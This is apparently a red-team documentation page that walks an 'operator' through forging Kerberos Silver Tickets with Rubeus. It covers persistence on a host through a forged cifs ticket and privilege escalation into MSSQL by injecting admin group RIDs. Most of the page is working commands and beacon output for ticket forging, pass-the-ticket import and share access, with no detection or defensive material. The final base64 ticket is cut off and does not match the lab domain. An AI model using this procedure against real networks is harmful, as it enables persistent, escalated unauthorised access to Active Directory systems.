---
title: "Kerberos Ticket Forgery (Silver Tickets)"
date: 2026-09-25
weight: 9
type: docs
tags:
  - Active Directory
  - Domain Dominance
---

Ticket forgery is a post-exploitation method [[T1558](https://attack.mitre.org/techniques/T1558/)] where an operator uses previously compromised service or host secrets to manually generate Kerberos tickets offline. Instead of authenticating through a standard request to a Key Distribution Center (KDC), the operator crafts the authentication token locally and injects it into the active logon session to hijack access.

This section covers the mechanics of building targeted service tokens to maintain persistence or elevate access inside specific infrastructure applications.

## Silver Tickets

A "Silver Ticket" is a manually forged Kerberos service ticket (TGS) created by utilizing the unique password hash of a specific service account or computer object [[T1558.002](https://attack.mitre.org/techniques/T1558/002/)]. Because it is signed with the service's specific secret, it can only grant access to designated protocols on that individual machine.

### Use Case 1: Local System Persistence

A common application for this technique involves maintaining administrative persistence on a target system after initial exploitation. Once high-privileged control is established, an operator can extract the computer account's password hash. This secret allows the operator to forge a ticket for remote management protocols (such as `cifs` or `host`) to return to the system later, bypassing the initial vulnerability vectors or access routes entirely. 

* *Note:* Active Directory automatically cycles computer account passwords every 30 days by default, which places a hard time limit on the validity of a forged machine ticket.

Because the ticket assembly occurs offline, this step can be executed from the operator's analysis workstation. In this scenario, we use the AES-256 hash of the `db-srv` computer profile to craft a `cifs` ticket, impersonating the Domain Administrator account.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/db-srv /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:ARCADIA.LOCAL /sid:S-1-5-21-4192837465-1122334455-998877665 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : ARCADIA.LOCAL (ARCADIA)
[*] SID            : S-1-5-21-4192837465-1122334455-998877665
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : cifs
[*] Target         : db-srv

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator' to 'cifs/db-srv'

[*] AuthTime       : 04/03/2025 12:32:31
[*] StartTime      : 04/03/2025 12:32:31
[*] EndTime        : 04/03/2025 22:32:31
[*] RenewTill      : 11/03/2025 12:32:31

[*] base64(ticket.kirbi):

      doIFb[...snip...]kYi0x
```

Parameters used:
* `/service`: Specifies the target application identifier.
* `/aes256`: Specifies the cryptographic hash of the target host computer account.
* `/user`: The identity context to impersonate inside the ticket.
* `/domain`: The Fully Qualified Domain Name (FQDN) of the operating environment.
* `/sid`: The security identifier of the root domain.

Rubeus defaults to standard high-privilege parameters, inserting a user RID of `500` alongside well-known administrative groups (`520`, `512`, `513`, `519`, `518`). These identifiers can be fine-tuned via the `/id` and `/groups` options.

Once generated, create a local placeholder token to establish an authentication context, import the forged object into the session using a Pass-the-Ticket (PTT) routine, and verify access across the target filesystem.

```powershell
beacon> make_token ARCADIA\Administrator FakePass
[+] Impersonated ARCADIA\Administrator (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x

[*] Action: Import Ticket
[+] Ticket successfully imported!

beacon> run klist

Current LogonId is 0:0x1782fca

Cached Tickets: (1)

#0>	Client: Administrator @ ARCADIA.LOCAL
	Server: cifs/db-srv @ ARCADIA.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a00000 -> forwardable renewable pre_authent 
	Start Time: 3/4/2025 12:32:31 (local)
	End Time:   3/4/2025 22:32:31 (local)
	Renew Time: 3/11/2025 12:32:31 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

beacon> ls \\db-srv\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     03/04/2025 09:57:42   Users
          dir     03/03/2025 13:37:44   Windows
 
beacon> rev2self
[*] Tasked beacon to revert token
```

### Use Case 2: Privilege Escalation inside Managed Services

Silver tickets are also useful when chained with techniques that expose service secrets, such as Kerberoasting. Suppose you uncover the cleartext password of a domain user account configured to execute an MSSQL database process. By default, this database service account might not hold administrative (`sysadmin`) permissions inside the SQL instance engine, making direct authentication unhelpful for database modification.

However, an operator can use that service account's secret to forge an application ticket targeting the database service instance, manually injecting high-privilege group identifiers to impersonate an instance administrator.

First, calculate the necessary cryptographic formats from the known cleartext credentials:

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:sql_svc /domain:ARCADIA.LOCAL /password:ArcadiaPass2026!

[*] Action: Calculate Password Hash(es)

[*] Input password             : ArcadiaPass2026!
[*] Input username             : sql_svc
[*] Input domain               : ARCADIA.LOCAL
[*] Salt                       : ARCADIA.LOCALsql_svc
[*]       rc4_hmac             : A3F9E2B10CD8374E56910FAD283C71BF
[*]       aes128_cts_hmac_sha1 : 53B5F3804FBF13E7DD624E71D18DF9BB
[*]       aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
```

Next, craft the forged database session ticket targeting `MSSQLSvc/db-srv.arcadia.local:1433`. We adjust the identity details to mirror a known user, `m_maldonado`, while explicitly mapping administrative application groups into the authorization structure:

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/db-srv.arcadia.local:1433 /rc4:A3F9E2B10CD8374E56910FAD283C71BF /user:m_maldonado /id:1108 /groups:513,1106,1107,4602 /domain:ARCADIA.LOCAL /sid:S-1-5-21-4192837465-1122334455-998877665 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : ARCADIA.LOCAL (ARCADIA)
[*] SID            : S-1-5-21-4192837465-1122334455-998877665
[*] UserId         : 1108
[*] Groups         : 513,1106,1107,4602
[*] ServiceKey     : A3F9E2B10CD8374E56910FAD283C71BF
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : A3F9E2B10CD8374E56910FAD283C71BF
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : MSSQLSvc
[*] Target         : db-srv.arcadia.local:1433

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'm_maldonado' to 'MSSQLSvc/db-srv.arcadia.local:1433'

[*] AuthTime       : 04/03/2025 12:39:29
[*] StartTime      : 04/03/2025 12:39:29
[*] EndTime        : 04/03/2025 22:39:29
[*] RenewTill      : 11/03/2025 12:39:29

[*] base64(ticket.kirbi):

      doIFV[...snip...]xNDMz
```

Parameters used for contextual parsing:
* `/id`: The primary security relative identifier (RID) for the target user account (`m_maldonado`).
* `/groups`: Custom RIDs mapped directly into the ticket data. Here, `513` represents Domain Users, `1106` represents Workstation Admins, `1107` represents Server Admins, and `4602` explicitly flags Database Admins to grant the required application execution context.

```powershell
beacon> make_token ARCADIA\m_maldonado FakePass
[+] Impersonated ARCADIA\m_maldonado (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFVzCCBVOgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQ0bC0NPTlRPU08uQ09NojAwLqADAgECoScwJRsITVNTUUxTdmMbGWxvbi1kYi0xLmNvbnRvc28uY29tOjE0MzOjggP4MIID9KADAgEXoQMCAQOiggPmBIID4lLsm25mHlmcUdR3kTxrhMNe2UjUNUEVfvRtVXTT6TQRq9kzXz3uKs6SO88C+8677syeuKGUf47X5vUt82/OuKDiR3v6JJCsbqr+sWApHLIH+k8KovDDSrTvLRM+SoVCUvCFEH+rh/C
```
